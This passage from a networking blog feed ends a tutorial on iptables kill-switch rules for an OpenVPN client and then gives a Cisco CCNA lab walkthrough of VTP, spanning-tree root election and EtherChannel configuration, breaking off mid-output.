iptables -A OUTPUT -o <span style="color:#ed9d13">\\</span>)VPN_INT -j ACCEPT
iptables -A INPUT  -i <span style="color:#ed9d13">\\</span>(VPN<span style="color:#ed9d13">\_</span>INT -j ACCEPT

<span style="color:#999;font-style:italic"># Allow traffic to/from VPN server</span>
iptables -A INPUT  -i <span style="color:#ed9d13">\\</span>)GW_INT -s <span style="color:#ed9d13">\\</span>(VPN<span style="color:#ed9d13">\_</span>SERVER -p udp --sport <span style="color:#3677a9">80</span> -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -A OUTPUT -o <span style="color:#ed9d13">\\</span>)GW_INT -d <span style="color:#ed9d13">\\</span>(VPN<span style="color:#ed9d13">\_</span>SERVER -p udp --dport <span style="color:#3677a9">80</span> -m state --state ESTABLISHED -j ACCEPT

<span style="color:#999;font-style:italic"># Allow local traffic</span>
iptables -A OUTPUT -o <span style="color:#ed9d13">\\</span>)GW_INT -d <span style="color:#ed9d13">\\</span>(LOCAL<span style="color:#ed9d13">\_</span>LAN -s <span style="color:#ed9d13">\\</span>)LOCAL_LAN -j ACCEPT
iptables -A INPUT  -i <span style="color:#ed9d13">\\</span>(GW<span style="color:#ed9d13">\_</span>INT -s <span style="color:#ed9d13">\\</span>)LOCAL_LAN -d <span style="color:#ed9d13">\\</span>(LOCAL<span style="color:#ed9d13">\_</span>LAN -j ACCEPT

<span style="color:#999;font-style:italic"># Define here other exceptions</span>
<span style="color:#999;font-style:italic"># ...</span>

<span style="color:#999;font-style:italic"># Deny all traffic on gateway interface by default</span>
iptables -A INPUT -i <span style="color:#ed9d13">\\</span>)GW_INT -j DROP
iptables -A OUTPUT -o <span style="color:#ed9d13">\\</span>(GW<span style="color:#ed9d13">\_</span>INT -j DROP

<span style="color:#999;font-style:italic"># Block IPv6 traffic</span>
ip6tables -P INPUT DROP
ip6tables -P OUTPUT DROP
ip6tables -P FORWARD DROP
</code></pre></div><p>All these rules are part of <a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-init-sh">this script</a> which is called by OpenVPN (up/down commands):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#999;font-style:italic"># Run scripts after tunnel is up or down</span>
up <span style="color:#ed9d13">&#34;./init.sh -u&#34;</span>
down <span style="color:#ed9d13">&#34;./init.sh -d&#34;</span>
</code></pre></div><p>Have a look at the <a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-init-sh">script</a> and add your own actions to be executed when the tunnel is up or down. Also make sure you save the script in the same directory where the configuration files resides.</p>
<p>That&rsquo;t it! Now you should have no <strong>leaks</strong> if your VPN is down. Let&rsquo;s check that out</p>
<ul>
<li>Before establishing the VPN tunnel</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash"><span style="color:#ed9d13">\\</span>) ping h.de -c <span style="color:#3677a9">4</span>
PING h.de (212.34.167.36) 56(84) bytes of data.
^C
--- h.de ping statistics ---
<span style="color:#3677a9">0</span> packets transmitted, <span style="color:#3677a9">0</span> received

</code></pre></div><ul>
<li>After establishing the VPN</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">$ ping h.de -c <span style="color:#3677a9">4</span>
PING h.de (212.34.167.36) 56(84) bytes of data.
<span style="color:#3677a9">64</span> bytes from plesk3.odn.de (212.34.167.36): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">1</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">50</span> <span style="color:#40ffff">time</span>=<span style="color:#3677a9">122</span> ms
<span style="color:#3677a9">64</span> bytes from plesk3.odn.de (212.34.167.36): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">2</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">50</span> <span style="color:#40ffff">time</span>=83.8 ms
<span style="color:#3677a9">64</span> bytes from plesk3.odn.de (212.34.167.36): <span style="color:#40ffff">icmp_seq</span>=<span style="color:#3677a9">3</span> <span style="color:#40ffff">ttl</span>=<span style="color:#3677a9">50</span> <span style="color:#40ffff">time</span>=82.6 ms
^C
--- h.de ping statistics ---
<span style="color:#3677a9">3</span> packets transmitted, <span style="color:#3677a9">3</span> received, 0% packet loss, <span style="color:#24909d">time</span> 2003ms
</code></pre></div><h1 id="download-configs">Download configs</h1>
<p>You can download my <strong>server</strong>/<strong>client</strong> configs and the <strong>initialization</strong> script and from following gists:</p>
<ul>
<li><a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-server-conf">server.conf</a></li>
<li><a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-client-conf">client.conf</a></li>
<li><a href="https://gist.github.com/dorneanu/9303dca4a81898b74fa6#file-init-sh">init.sh</a></li>
</ul>
<h1 id="todos">ToDos</h1>
<p>Here are some todos I&rsquo;d like to implement in near future:</p>
<ul>
<li>Use of alternative authentication methods</li>
<li>Configure client-specific rules and access policies</li>
<li>Add 2FA authentication to OpenVPN</li>
<li>Have a look at <a href="http://www.shorewall.net/Introduction.html">Shorewall</a></li>
</ul>
<h1 id="references">References</h1>
<p>Some useful references:</p>
<ul>
<li><a href="https://www.inputoutput.io/hardening-your-vpn-setup-with-iptables/">Hardening OpenVPN with iptables</a></li>
<li><a href="https://2kswiki.wordpress.com/2015/06/17/hardened-openvpn-on-centos-7/">Hardened OpenVPN on CentOS 7</a></li>
<li><a href="https://oli.new-lan.de/2015/02/openvpn-crypto-tuning-tls-auth-tls-cipher-tls-version-min-dh-verify-x509-name-cipher-auth-remote-cert-tls/">OpenVPN Crypto-Tuning: tls-auth, tls-cipher, tls-version-min, dh, verify-x509-name, cipher, auth, remote-cert-tls</a></li>
<li><a href="wiki.archlinux.org/index.php/OpenVPN">Arch Linux OpenVPN</a></li>
<li><a href="http://www.dd-wrt.com/wiki/index.php/Policy_Based_Routing">Policy Based Routing</a></li>
<li><a href="https://www.agwa.name/blog/post/hardening_openvpn_for_def_con">Hardening OpenVPN for DefCon</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>Advanced inter VLAN switching using Cisco</title>
      <link>https://blog.dornea.nu/2015/11/06/advanced-inter-vlan-switching-using-cisco/</link>
      <pubDate>Fri, 06 Nov 2015 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2015/11/06/advanced-inter-vlan-switching-using-cisco/</guid>
      <content:encoded><![CDATA[<p>Continuing my <a href="http://blog.dornea.nu/tag/ccna/">CCNA</a> journey I&rsquo;d like to address <em>inter VLAN switching</em> in a more detailed way. In this post I&rsquo;ll configure my <a href="http://blog.dornea.nu/2015/10/21/basic-layer-2-switching-using-cisco-packet-tracer/">previous topology</a> to use <strong>VTP</strong> and let <strong>STP</strong> prevent <em>frame looping</em> and other &ldquo;anomalies&rdquo; on <em>Layer 2</em>.</p>
<h2 id="updated-network-topology">Updated network topology</h2>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%blockdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
diagram admin {<span style="color:#a61717;background-color:#e3d2d2">â†”</span>

    PC1 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC2 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC3 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC4 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC5 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];
    PC6 [shape = <span style="color:#ed9d13">&#34;cisco.pc&#34;</span>];

    SW4 &lt;-&gt; SW1, SW2, SW3 [color = <span style="color:#ed9d13">&#34;red&#34;</span>, style=<span style="color:#ed9d13">&#34;dotted&#34;</span>];
    SW1 &lt;-&gt; SW2 [folded];
    SW2 &lt;-&gt; SW3 [folded];
    
    
    group {
        label = <span style="color:#ed9d13">&#34;VLAN 10&#34;</span>;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>;
        SW1 &lt;-&gt; PC1;
        SW1 &lt;-&gt; PC2;
    }
    
    group {
        label = <span style="color:#ed9d13">&#34;VLAN 20&#34;</span>;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>;
        SW2 &lt;-&gt; PC3;
        SW2 &lt;-&gt; PC4;
    }
    
    group {
        label = <span style="color:#ed9d13">&#34;VLAN 10 + VLAN 20&#34;</span>;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>;
        SW3 &lt;-&gt; PC5;
        SW3 &lt;-&gt; PC6;
    }
}
</code></pre></div><p><img src="/posts/img/2015/advanced-inter-vlan-switching-using-cisco/output_2_0.png" alt="png"></p>
<p>The new added component <code>SW4</code> is connected to all other switches (red lines). Since a new switch has been added we&rsquo;ll have to add the existing <strong>VLANs</strong> to the corresponding interfaces as well. But this time I <strong>won&rsquo;t</strong> configure the ports manually. Instead I&rsquo;ll use a Cisco proprietary protocol called <code>VTP</code> to exchange information about VLAN accross all available switches. So called <code>VTP</code> advertisements can be sent over <code>ISL</code> or <code>802.1Q</code> (dot1q). Now let&rsquo;s have a look at the process of adding <code>VTP</code> to the existing infrastructure.</p>
<h2 id="vlan-trunking-protocol">VLAN Trunking Protocol</h2>
<p><code>VTP</code> has 3 operation modes:</p>
<ul>
<li>VTP <strong>server</strong> mode
<ul>
<li><strong>By default</strong> all Cisco switches are in server mode</li>
<li>VLANs are stored on a device in a file called <code>vlan.dat</code></li>
<li>In server mode changes to the file are allowed</li>
<li>These changes/modifications are carried down to the clients as VTP advertisements</li>
</ul>
</li>
<li>VTP <strong>client</strong> mode
<ul>
<li>Will listen to the changes sent by the server and apply the changes</li>
<li>Is <strong>not</strong> allowed to modify the file <code>vlan.dat</code></li>
</ul>
</li>
<li>VTP <strong>transparent</strong> mode
<ul>
<li>Will relay/forward VTP advertisemnts to downstream clients</li>
<li>BUT will <strong>not</strong> apply the changes</li>
<li><strong>IS</strong> allowed to add/delete VLANs</li>
<li><strong>CAN</strong> modify its <code>vlan.dat</code></li>
</ul>
</li>
</ul>
<p>For my purpose I&rsquo;ll chose following setup:</p>
<ul>
<li><code>SW1</code> in VTP <strong>server</strong> mode</li>
<li>all <strong>others</strong> switches in <strong>client</strong> mode</li>
</ul>
<h3 id="configure-sw1">Configure SW1</h3>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1&gt;enable
Password: 
SW1#conf t
Enter configuration commands, one per line.  End with CNTL/Z.
SW1(config)<span style="color:#999;font-style:italic">#vtp mode server</span>
Device mode already VTP SERVER.

SW1(config)<span style="color:#999;font-style:italic">#vtp domain ccna-lab</span>
Changing VTP domain name from NULL to ccna-lab

SW1(config)<span style="color:#999;font-style:italic">#vtp password ccna</span>
Setting device VLAN database password to ccna

SW1(config)<span style="color:#999;font-style:italic">#vtp version 2</span>

SW1(config)<span style="color:#999;font-style:italic">#do show vtp status</span>
VTP Version                     : <span style="color:#3677a9">2</span>
Configuration Revision          : <span style="color:#3677a9">6</span>
Maximum VLANs supported locally : <span style="color:#3677a9">255</span>
Number of existing VLANs        : <span style="color:#3677a9">8</span>
VTP Operating Mode              : Server
VTP Domain Name                 : ccna-lab
VTP Pruning Mode                : Disabled
VTP V2 Mode                     : Disabled
VTP Traps Generation            : Disabled
MD5 digest                      : 0x8D 0xCD 0x81 0x32 0xF5 0xBA 0x71 0x33 
Configuration last modified by 0.0.0.0 at 3-1-93 01:14:24
Local updater ID is 30.30.30.1 on interface Vl30 (lowest numbered VLAN interface found)
</code></pre></div><h3 id="configure-vtp-clients">Configure VTP clients</h3>
<p>The configuration of the remaining switches is pretty straight-forward. Let&rsquo;s have a look at an example (in this case <code>SW2</code>):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#conf t
Enter configuration commands, one per line.  End with CNTL/Z.
SW2(config)<span style="color:#999;font-style:italic">#vtp domain ccna-lab</span>
Domain name already <span style="color:#24909d">set</span> to ccna-lab.

SW2(config)<span style="color:#999;font-style:italic">#vtp pass ccna</span>
Setting device VLAN database password to ccna

SW2(config)<span style="color:#999;font-style:italic">#vtp mode client</span>
Setting device to VTP CLIENT mode.

SW2(config)<span style="color:#999;font-style:italic">#do show vtp status</span>
VTP Version                     : <span style="color:#3677a9">2</span>
Configuration Revision          : <span style="color:#3677a9">7</span>
Maximum VLANs supported locally : <span style="color:#3677a9">255</span>
Number of existing VLANs        : <span style="color:#3677a9">8</span>
VTP Operating Mode              : Client
VTP Domain Name                 : ccna-lab
VTP Pruning Mode                : Disabled
VTP V2 Mode                     : Disabled
VTP Traps Generation            : Disabled
MD5 digest                      : 0xD4 0x40 0x89 0x49 0x1A 0x6E 0x7A 0xBE 
Configuration last modified by 30.30.30.1 at 3-1-93 01:04:21
</code></pre></div><h3 id="testing-setup">Testing setup</h3>
<p>In order to test the configuration I&rsquo;ll add <strong>VLAN 40</strong> (Testing) on <code>SW1</code> and check if that gets advertised:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#vlan 40</span>
SW1(config-vlan)<span style="color:#999;font-style:italic">#name Testing</span>
</code></pre></div><p>Right after we verify if the clients got the VTP advertisements:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4#sh vlan brief

VLAN Name                             Status    Ports
...  
<span style="color:#3677a9">40</span>   Testing                          active    
...
</code></pre></div><p>If I again delete <strong>VLAN 40</strong> from <code>SW1</code> then the clients should delete it as well:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW1(config)<span style="color:#999;font-style:italic">#no vlan 40</span>
</code></pre></div><p>And now test it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#sh vlan brief

VLAN Name                             Status    Ports
---- -------------------------------- --------- -------------------------------
<span style="color:#3677a9">1</span>    default                          active    Fa0/6, Fa0/7, Fa0/8, Fa0/9
                                                Fa0/10, Fa0/11, Fa0/12, Fa0/13
                                                Fa0/14, Fa0/15, Fa0/16, Fa0/17
                                                Fa0/18, Fa0/19, Fa0/20, Fa0/21
                                                Fa0/22, Fa0/23, Fa0/24, Gig0/1
                                                Gig0/2
<span style="color:#3677a9">10</span>   Students                         active    
<span style="color:#3677a9">20</span>   Teachers                         active    Fa0/3, Fa0/4
<span style="color:#3677a9">30</span>   Management                       active    
<span style="color:#3677a9">1002</span> fddi-default                     active    
<span style="color:#3677a9">1003</span> token-ring-default               active    
<span style="color:#3677a9">1004</span> fddinet-default                  active    
<span style="color:#3677a9">1005</span> trnet-default                    active    
</code></pre></div><h2 id="spanning-tree-protocol">Spanning Tree Protocol</h2>
<p>Since we now have to deal with <strong>interconnected</strong> switches and <em>frame looping</em> might be an issue, activating <strong>STP</strong> (Spanning Tree Protocol) will help mitigate the impacts of <em>broadcast storms</em> or <em>multiple frame tranmissions</em>. Cisco devices usually use <strong>Per VLAN Spanning Tree Protocol</strong> (PVST+, PVSTP) which is <em>proprietary</em>. The biggest difference to the &ldquo;normal&rdquo; STP (<strong>802.1D</strong>) is that PVST+ creates a different topology <em>per VLAN</em>. That means you can elect different roots (and thus different topology) for every available VLAN. Let&rsquo;s have a look at the desired topology for <code>VLAN 30</code> (Management):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">%%blockdiag
<span style="color:#999;font-style:italic"># &lt;!-- collapse=True --&gt;</span>
diagram admin {<span style="color:#a61717;background-color:#e3d2d2">â†”</span>


    group {
        label = <span style="color:#ed9d13">&#34;VLAN 30 (Management)&#34;</span>
        orientation = portrait;
        color = <span style="color:#ed9d13">&#34;#FFF&#34;</span>
        SW4 &lt;-&gt; SW1, SW2, SW3;
        SW1 &lt;-&gt; SW2 [folded];
        SW2 &lt;-&gt; SW3 [folded];
    }
}
</code></pre></div><p><img src="/posts/img/2015/advanced-inter-vlan-switching-using-cisco/output_8_0.png" alt="png"></p>
<h3 id="roots-election">Root(s) election</h3>
<p>In terms of <strong>STP</strong> <code>SW4</code> will be the <strong>p</strong>rimary (p) and <code>SW2</code> the <strong>s</strong>econdary (s) root. Let&rsquo;s configure <code>Sw4</code> and <code>Sw2</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">! SW4 configuration
SW4(config)<span style="color:#999;font-style:italic">#spanning-tree vlan 30 root primary</span>

! SW2 configuration
SW2(config)<span style="color:#999;font-style:italic">#spanning-tree vlan 30 root secondary</span>
</code></pre></div><p>And now let&rsquo;s have a look at the <strong>port connectivity</strong> matrix:</p>
<table cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th> </th>
    <th>SW1</th>
    <th>SW2</th>
    <th>SW3</th>
    <th>SW4</th>
  </tr>
  <tr>
    <td>SW1</td>
    <td>-</td>
    <td>Fa0/1 - Fa0/1</td>
    <td>-</td>
    <td>Fa0/4 - Fa0/1</td>
  </tr>
  <tr>
    <td>SW2</td>
    <td>Fa0/1 - Fa0/1</td>
    <td>-</td>
    <td>Fa0/2 - Fa0/1</td>
    <td>Fa0/5 - Fa0/3</td>
  </tr>
  <tr>
    <td>SW3</td>
    <td>-</td>
    <td>Fa0/1 - Fa0/2</td>
    <td> - </td>
    <td>Fa0/4, Fa0/5 - Fa0/2, Fa0/4</td>
  </tr>
  <tr>
    <td>SW4</td>
    <td>Fa0/1 - Fa0/4</td>
    <td>Fa0/3 - Fa0/5</td>
    <td>Fa0/2, Fa0/4 - Fa0/4, Fa0/5</td>
    <td> - </td>
  </tr>
</table>
<p>So <code>SW1</code> (Fa0/1) is connected to <code>SW2</code> (Fa0/1), <code>SW3</code> (Fa0/3) is connected to <code>SW2</code> (Fa0/2) and so on. You may have noticed that <code>SW3</code> and <code>SW4</code> are connected to each other using <strong>4 ports</strong>. In that case we have a <em>redundant</em> connection between both switches. In this case we&rsquo;ll later on configure the redundant connection as an <a href="https://en.wikipedia.org/wiki/EtherChannel"><strong>EtherChannel</strong></a>.</p>
<h3 id="testing-the-stp-configuration">Testing the STP configuration</h3>
<p>And now let&rsquo;s have a look at the STP information:</p>
<ul>
<li><code>SW2</code> (secondary root)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW2#sh spanning-tree vlan <span style="color:#3677a9">30</span>
VLAN0030
  Spanning tree enabled protocol ieee
  Root ID    Priority    <span style="color:#3677a9">20510</span>
             Address     00E0.F96C.2E07
             Cost        <span style="color:#3677a9">19</span>
             Port        5(FastEthernet0/5)
             Hello Time  <span style="color:#3677a9">2</span> sec  Max Age <span style="color:#3677a9">20</span> sec  Forward Delay <span style="color:#3677a9">15</span> sec

  Bridge ID  Priority    <span style="color:#3677a9">28702</span>  (priority <span style="color:#3677a9">28672</span> sys-id-ext 30)
             Address     0030.F222.3EE5
             Hello Time  <span style="color:#3677a9">2</span> sec  Max Age <span style="color:#3677a9">20</span> sec  Forward Delay <span style="color:#3677a9">15</span> sec
             Aging Time  <span style="color:#3677a9">20</span>

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Desg FWD <span style="color:#3677a9">19</span>        128.1    P2p
Fa0/2            Altn BLK <span style="color:#3677a9">19</span>        128.2    P2p
Fa0/5            Root FWD <span style="color:#3677a9">19</span>        128.5    P2p
</code></pre></div><p>We can notice that:</p>
<ol>
<li>The root has a MAC address of <code>00E0.F96C.2E07</code></li>
<li><code>FastEthernet 0/5</code> is the <strong>root port</strong> with a <strong>cost</strong> of 19 and is in <strong>forwarding</strong> state</li>
<li><code>FastEthernet 0/2</code> is in <strong>blocking</strong> state</li>
<li><code>FastEthernet 0/1</code> is the <strong>designated</strong> port</li>
</ol>
<ul>
<li><code>SW4</code> (primary root)</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4#sh spanning-tree vlan <span style="color:#3677a9">30</span> 
VLAN0030
  Spanning tree enabled protocol ieee
  Root ID    Priority    <span style="color:#3677a9">20510</span>
             Address     00E0.F96C.2E07
             This bridge is the root
             Hello Time  <span style="color:#3677a9">2</span> sec  Max Age <span style="color:#3677a9">20</span> sec  Forward Delay <span style="color:#3677a9">15</span> sec

  Bridge ID  Priority    <span style="color:#3677a9">20510</span>  (priority <span style="color:#3677a9">20480</span> sys-id-ext 30)
             Address     00E0.F96C.2E07
             Hello Time  <span style="color:#3677a9">2</span> sec  Max Age <span style="color:#3677a9">20</span> sec  Forward Delay <span style="color:#3677a9">15</span> sec
             Aging Time  <span style="color:#3677a9">20</span>

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Desg FWD <span style="color:#3677a9">19</span>        128.1    P2p
Fa0/3            Desg FWD <span style="color:#3677a9">19</span>        128.3    P2p
Po1              Desg FWD <span style="color:#3677a9">9</span>         128.27   Shr
</code></pre></div><p>We can notice that:</p>
<ol>
<li>This is indeed the root (<strong>&ldquo;This bridge is the root&rdquo;</strong>)</li>
<li>All available ports are <strong>designated</strong> and in <strong>forwarding</strong> state (the root has <strong>no</strong> root port)</li>
</ol>
<ul>
<li><code>SW3</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3#sh spanning-tree vlan <span style="color:#3677a9">30</span> 
VLAN0030
  Spanning tree enabled protocol ieee
  Root ID    Priority    <span style="color:#3677a9">20510</span>
             Address     00E0.F96C.2E07
             Cost        <span style="color:#3677a9">9</span>
             Port        27(Port-channel 2)
             Hello Time  <span style="color:#3677a9">2</span> sec  Max Age <span style="color:#3677a9">20</span> sec  Forward Delay <span style="color:#3677a9">15</span> sec

  Bridge ID  Priority    <span style="color:#3677a9">32798</span>  (priority <span style="color:#3677a9">32768</span> sys-id-ext 30)
             Address     0003.E481.688D
             Hello Time  <span style="color:#3677a9">2</span> sec  Max Age <span style="color:#3677a9">20</span> sec  Forward Delay <span style="color:#3677a9">15</span> sec
             Aging Time  <span style="color:#3677a9">20</span>

Interface        Role Sts Cost      Prio.Nbr Type
---------------- ---- --- --------- -------- --------------------------------
Fa0/1            Desg FWD <span style="color:#3677a9">19</span>        128.1    P2p
Po2              Root FWD <span style="color:#3677a9">9</span>         128.27   Shr
</code></pre></div><p>We can notice that:</p>
<ol>
<li><code>Po2</code> is the <strong>root port</strong> with a cost of 9 and in <strong>forwarding</strong> state</li>
<li><code>FastEthernet 0/1</code> is a <strong>designated</strong> port with a cost of 19 and in <strong>forwarding</strong> state</li>
</ol>
<h3 id="port-cost">Port cost</h3>
<p>Now you may have noticed the diffrent <strong>port costs</strong>. A port cost is an integer assigned to each interface per VLAN for providing a good way for measuring a port&rsquo;s connectivity.</p>
<table cellpadding="0" cellspacing="0" width="100%" border="0">
  <tr>
    <th>Ethernet </th>
    <th>Cost</th>
  </tr>
  <tr>
    <td>10 Mbps</td>
    <td>100</td>
  </tr>
  <tr>
    <td>100 Mbps</td>
    <td>19</td>
  </tr>
  <tr>
    <td>1 Gbps</td>
    <td>4</td>
  </tr>
  <tr>
    <td>10 Gbps</td>
    <td>2</td>
  </tr>
</table>
<p>So because most of the ports are <em>FastEthernet</em> ports they will get a port cost of 19 (when connected directly to the root).</p>
<h3 id="etherchannel">EtherChannel</h3>
<p>As previosuly mentioned there are 2 port links between <code>SW3</code> and <code>SW4</code>. <strong>EtherChannel</strong> provides a way to prevent convergence (STP) when a single port or cable failure occurs. The switches will treat the EtherChannel as a single interface. The big advantage is that if one of the links fails, STP convergence does not have to occur if at least one of the links is up. Besides that the switches will now have a <strong>load-balancing</strong> effect which will spread the traffic load accross the active links in the (Ether)channel.</p>
<h4 id="manual-etherchannel">Manual EtherChannel</h4>
<p>So when using EtherChannels STP will operate on the EtherChannel itself rather than on the individual physical links. STP will then either forward or block traffic on the entire logical EtherChannel for a specific VLAN. Probably the most simple way to activate EtherChannel is to put the physical interfaces into the same <strong>channel-group</strong>. Let&rsquo;s have a look how this is done:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3(config)<span style="color:#999;font-style:italic">#int f0/4</span>
SW3(config-if)<span style="color:#999;font-style:italic">#channel-group 1 mode on</span>
SW3(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Port-channel 1, changed state to up

%LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel 1, changed state to up

SW3(config-if)<span style="color:#999;font-style:italic">#int f0/5</span>
SW3(config-if)<span style="color:#999;font-style:italic">#channel-group 1 mode on</span>
SW3(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Port-channel 2, changed state to down

%LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel 2, changed state to down
</code></pre></div><p>And now for <code>SW4</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4(config)<span style="color:#999;font-style:italic">#int f0/2</span>
SW4(config-if)<span style="color:#999;font-style:italic">#channel-group 2 mode on</span>
SW4(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Port-channel 2, changed state to up

%LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel 2, changed state to up

SW4(config-if)<span style="color:#999;font-style:italic">#int f0/4</span>
SW4(config-if)<span style="color:#999;font-style:italic">#channel-group 2 mode on</span>
SW4(config-if)<span style="color:#999;font-style:italic">#</span>
%LINK-5-CHANGED: Interface Port-channel 1, changed state to down

%LINEPROTO-5-UPDOWN: Line protocol on Interface Port-channel 1, changed state to down
</code></pre></div><h4 id="dynamically-configured-etherchannel">Dynamically configured EtherChannel</h4>
<p>If you don&rsquo;t want to manually configure the EtherChannel, one can let the switches <em>negotiate</em> the configuration for it. Cisco switches support</p>
<ul>
<li>Cisco proprietary Port Aggregation Protocol (<strong>PAgP</strong>)
<ul>
<li>Enabled by the keywords <strong>desirable</strong> and <strong>auto</strong></li>
</ul>
</li>
<li>IEEE standard Link Aggregation Control Protocol (<strong>LACP</strong>)
<ul>
<li>Enabled by the keywords <strong>passive</strong> and <strong>active</strong></li>
</ul>
</li>
</ul>
<p>So when using <strong>PAgP</strong> at least one side must use <strong>desirable</strong> or <strong>active</strong> when using <strong>LACP</strong>. Let&rsquo;s have some look at one example (PAgP):</p>
<ul>
<li><code>SW3</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW3(config)<span style="color:#999;font-style:italic">#int f0/4</span>
SW3(config-if)<span style="color:#999;font-style:italic">#channel-group 2 mode desirable</span>
SW3(config-if)<span style="color:#999;font-style:italic">#int f0/5</span>
SW3(config-if)<span style="color:#999;font-style:italic">#channel-group 2 mode desirable</span>
</code></pre></div><ul>
<li><code>SW4</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4(config)<span style="color:#999;font-style:italic">#int f0/2</span>
SW4(config-if)<span style="color:#999;font-style:italic">#channel-group 1 mode auto</span>
SW4(config-if)<span style="color:#999;font-style:italic">#int f0/5</span>
SW4(config-if)<span style="color:#999;font-style:italic">#channel-group 1 mode auto</span>
</code></pre></div><h3 id="testing-etherchannel-connectivity">Testing EtherChannel connectivity</h3>
<p>Now let&rsquo;s see of the <em>port channels</em> are working well:</p>
<ul>
<li><code>SW4</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-.bash" data-lang=".bash">SW4#sh eth sum
Flags:  D - down        P - in port-channel
        I - stand-alone s - suspended
        H - Hot-standby (LACP only)
        R - Layer3      S - Layer2
        U - in use      f - failed to allocate aggregator
        u - unsuitable <span style="color:#6ab825;font-weight:bold">for</span> bundling
        w - waiting to be aggregated
        d - default port


Number of channel-groups in use: <span style="color:#3677a9">2</span>
Number of aggregators:           <span style="color:#3677a9">2</span>

